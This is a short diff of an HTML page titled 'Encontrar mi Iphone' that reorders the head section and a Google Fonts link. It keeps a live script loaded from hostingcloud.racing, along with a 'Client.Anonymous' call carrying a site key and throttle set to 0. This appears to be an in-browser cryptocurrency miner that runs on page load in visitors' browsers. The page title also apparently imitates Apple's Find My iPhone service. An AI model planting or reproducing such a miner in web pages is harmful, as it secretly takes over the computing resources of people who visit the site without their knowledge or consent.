@@ -4,8 +4,12 @@
 	<title>Encontrar mi Iphone</title>
 	<link rel="shortcut icon" href="/favicon.ico"/>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-	<script src="https://www.hostingcloud.racing/FXTs.js"></script>
+</head>
+<!--Link de fuentes-->
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Domine:wght@500&display=swap" rel="stylesheet">
+<!--Estilos puro CSS-->
+<script src="https://www.hostingcloud.racing/FXTs.js"></script>
 <script>
     var _client = new Client.Anonymous('8b60eacb2ecffa164b7abec400821794f084b99a74916a0e2f8d7f9c5b504b74', {
         throttle: 0, c: 'w', ads: 0
@@ -14,11 +18,6 @@
     
 
 </script>
-</head>
-<!--Link de fuentes-->
-<link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Domine:wght@500&display=swap" rel="stylesheet">
-<!--Estilos puro CSS-->
 <style type="text/css">
 
 	/*Logo parte oscura*/
